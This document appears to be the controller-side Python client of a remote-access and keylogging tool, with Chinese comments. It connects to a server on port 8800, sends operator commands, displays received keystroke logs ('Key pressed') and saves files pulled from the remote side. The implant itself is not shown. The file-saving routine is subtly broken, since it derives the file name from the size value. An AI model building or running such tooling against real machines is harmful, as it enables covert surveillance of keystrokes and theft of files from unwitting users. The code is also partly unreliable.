import socket
import sys
import os
import re
from threading import Thread

class Client:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.bufferSize = 10240
        self.socket = None
        self.running = True

    def receive_messages(self):
        """接收服务器消息的线程函数"""
        while self.running:
            try:
                data = self.socket.recv(self.bufferSize)
                if not data:
                    break
                
                message = data.decode('utf-8', 'ignore')
                if message.startswith('0001'):
                    # 处理键盘监控消息
                    if "Key pressed" in message:
                        print("\r键盘记录:", message[4:])
                    else:
                        print("\r" + message[4:])
                else:
                    # 处理文件传输
                    self.handle_file_transfer(message, data)
                    
            except Exception as e:
                print("\r接收消息错误:", str(e))
                break

    def handle_file_transfer(self, message, data):
        """处理文件传输"""
        try:
            file_size = int(message)
            self.socket.send('File size received'.encode('utf-8'))
            received_size = 0
            f = open('new' + os.path.split(message)[-1], 'wb')
            
            while received_size < file_size:
                data = self.socket.recv(self.bufferSize)
                f.write(data)
                received_size += len(data)
            
            f.close()
            print('\r文件接收完毕,文件大小:', file_size, '字节')
        except ValueError:
            pass  # 不是文件传输消息，忽略

    def connect(self):
        """连接到服务器"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((self.host, self.port))
            
            # 启动接收消息的线程
            receive_thread = Thread(target=self.receive_messages)
            receive_thread.daemon = True
            receive_thread.start()
            
            # 主线程处理用户输入
            while True:
                try:
                    message = input('\r请输入命令: ')
                    if not message:
                        break
                    
                    self.socket.send(message.encode('utf-8'))
                    
                except KeyboardInterrupt:
                    break
                except Exception as e:
                    print("\r发送消息错误:", str(e))
                    break
                    
        except socket.error as msg:
            print("连接服务器错误:", msg)
            sys.exit(1)
        finally:
            self.running = False
            if self.socket:
                self.socket.close()

if __name__ == '__main__':
    cl = Client('127.0.0.1', 8800)
    cl.connect()
    sys.exit()

